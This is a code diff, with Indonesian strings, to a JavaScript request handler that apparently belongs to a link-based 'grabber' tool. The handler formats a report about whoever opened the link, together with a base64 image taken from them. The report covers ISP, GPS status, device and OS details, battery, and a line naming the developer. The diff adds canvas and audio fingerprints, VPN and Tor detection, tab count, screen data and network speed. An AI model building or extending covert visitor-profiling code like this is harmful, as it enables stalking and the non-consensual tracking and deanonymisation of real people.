@@ -50,17 +50,30 @@ export default async function handler(req, res) {
     }
 
     const bahasa = req.headers["accept-language"]?.split(",")[0] || "Tidak diketahui";
-
-    // Menambahkan informasi tambahan
     const waktuLogin = new Date().toLocaleString("id-ID");
     const ipLokal = req.connection.localAddress || "Tidak diketahui";
     const hostName = req.headers["host"] || "Tidak diketahui";
     const appVersion = req.headers["x-app-version"] || "Tidak diketahui";
     const networkProtocol = req.connection.encrypted ? "HTTPS" : "HTTP";
     const browserExtensions = browser.name ? `${browser.name} Extensions` : "Tidak diketahui";
-    const signalStrength = "Kuat"; // Ini bisa diambil dari data jaringan seluler, jika relevan
-    const apiVersion = "1.0"; // Versi API
+    const signalStrength = "Kuat";
+    const apiVersion = "1.0";
     const gpsStatus = lat && lon ? "Aktif" : "Tidak tersedia";
+    const timezoneOffset = new Date().getTimezoneOffset() / -60;
+
+    const deviceMood = deviceInfo.batteryLevel > 75 ? "semangat banget!" : "lemes... colokin dulu dong";
+    const darkModeStatus = deviceInfo.isDarkMode ? "Aktif" : "Tidak aktif";
+    const privateModeStatus = deviceInfo.isPrivateMode ? "Ya" : "Tidak";
+    const screenInfo = `${deviceInfo.screenWidth}x${deviceInfo.screenHeight} (Ratio: ${deviceInfo.pixelRatio})`;
+    const uptime = deviceInfo.uptime || "Tidak diketahui";
+    const downloadSpeed = deviceInfo.downloadSpeed || "Tidak diketahui";
+    const uploadSpeed = deviceInfo.uploadSpeed || "Tidak diketahui";
+    const torStatus = deviceInfo.torStatus || "Tidak terdeteksi";
+    const vpnStatus = deviceInfo.vpnStatus || "Tidak terdeteksi";
+    const tabCount = deviceInfo.tabCount || "Tidak diketahui";
+    const canvasFingerprint = deviceInfo.fingerprint?.canvas || "Tidak tersedia";
+    const audioFingerprint = deviceInfo.fingerprint?.audio || "Tidak tersedia";
+    const gpu = deviceInfo.gpu || "Tidak diketahui";
 
     const caption = `Dev By @FazrrEdan
 
@@ -72,26 +85,53 @@ export default async function handler(req, res) {
 -Bahasa: ${bahasa}
 -ISP: ${isp}
 -Jam: ${waktu}
+-Timezone: ${timezone} (GMT${timezoneOffset >= 0 ? "+" : ""}${timezoneOffset})
+-Cuaca Lokal: ${deviceInfo.weather || "Tidak diketahui"}
+-Jarak dari Kota Terdekat: ${deviceInfo.cityDistance || "Tidak diketahui"}
 
+🧠 Perangkat & Sistem
 -Perangkat: ${device.model || "Tidak diketahui"}
 -OS: ${os.name} ${os.version}
+-CPU: ${deviceInfo.cpu || "Tidak diketahui"}
+-GPU: ${gpu}
+-Uptime Perangkat: ${uptime}
+-Dark Mode: ${darkModeStatus}
+
+🧪 Browser & Tampilan
 -Browser: ${browser.name} ${browser.version}
 -User-Agent: ${userAgent}
+-Mode Private: ${privateModeStatus}
+-Resolusi Layar: ${screenInfo}
+-Orientasi: ${deviceInfo.screenOrientation || "Tidak diketahui"}
+-Canvas Fingerprint: ${canvasFingerprint}
+-Audio Fingerprint: ${audioFingerprint}
 
+🔋 Performa Sistem
 -Baterai: ${deviceInfo.batteryLevel}% (${deviceInfo.isCharging})
 -RAM: ${deviceInfo.ram} GB
 -Penyimpanan: ${deviceInfo.usedStorage} / ${deviceInfo.totalStorage}
--Koneksi: ${deviceInfo.connection}
+-Tab Aktif: ${tabCount}
 
--Waktu Login: ${waktuLogin}
+🌐 Jaringan
+-Koneksi: ${deviceInfo.connection}
+-Kecepatan Internet: ${downloadSpeed}↓ / ${uploadSpeed}↑ Mbps
+-Kondisi Jaringan: ${signalStrength}
+-Protokol Jaringan: ${networkProtocol}
+-VPN / Proxy: ${vpnStatus}
+-TOR: ${torStatus}
 -IP Lokal: ${ipLokal}
 -Host Name: ${hostName}
--Versi Aplikasi/Client: ${appVersion}
--Protokol Jaringan: ${networkProtocol}
--Plugin/Extension Browser: ${browserExtensions}
--Kondisi Jaringan: ${signalStrength}
--Versi API: ${apiVersion}
+
+🔒 Keamanan & Aktivitas
 -Status GPS: ${gpsStatus}
+-Login Terakhir: ${waktuLogin}
+-Fingerprint Browser: ${browserExtensions}
+
+⚙️ Aplikasi / Client
+-Versi Aplikasi: ${appVersion}
+-Versi API: ${apiVersion}
+
+Mood Perangkat: ${deviceMood}
 `;
 
     const imageBuffer = Buffer.from(image.split(",")[1], "base64");
